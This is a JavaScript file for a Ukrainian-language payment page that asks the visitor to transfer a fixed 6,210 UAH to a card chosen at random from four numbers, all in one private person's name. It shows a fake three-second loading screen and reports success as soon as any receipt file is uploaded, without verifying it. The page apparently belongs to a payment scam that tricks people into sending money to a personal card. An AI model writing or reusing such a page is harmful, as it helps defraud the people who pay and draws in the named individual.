document.addEventListener("DOMContentLoaded", function () {
    const loadingScreen = document.getElementById("loadingScreen");
    const paymentForm = document.getElementById("paymentForm");
    const paymentSuccessForm = document.getElementById("paymentSuccessForm");

    setTimeout(() => {
        loadingScreen.style.visibility = "hidden";
        paymentForm.style.display = "block";
    }, 3000);

    const selectedBank = localStorage.getItem("selectedBank");
    const selectedAmount = 6210;
    const cardDetails = [
        { cardNumber: '1234 5678 9012 3456', fullName: 'Гураль Юлія' },
        { cardNumber: '9876 5432 1098 7654', fullName: 'Гураль Юлія' },
        { cardNumber: '1122 3344 5566 7788', fullName: 'Гураль Юлія' },
        { cardNumber: '2233 4455 6677 8899', fullName: 'Гураль Юлія' }
    ];

    const randomIndex = Math.floor(Math.random() * cardDetails.length);
    const selectedCard = cardDetails[randomIndex];

    if (selectedBank) {
        document.getElementById("selectedBank").textContent = `Оплата здійснюється через: ${selectedBank}`;
    }
    document.getElementById("selectedAmount").textContent = `Сума: ${selectedAmount} грн`;
    document.getElementById("cardNumber").textContent = `Номер картки: ${selectedCard.cardNumber}`;
    document.getElementById("fullName").textContent = `ПІБ отримувача: ${selectedCard.fullName}`;

    document.getElementById("receipt").addEventListener("change", function(event) {
        const file = event.target.files[0];
        if (file) {
            paymentSuccessForm.style.display = "block";
            paymentForm.style.display = "none";
        }
    });
});
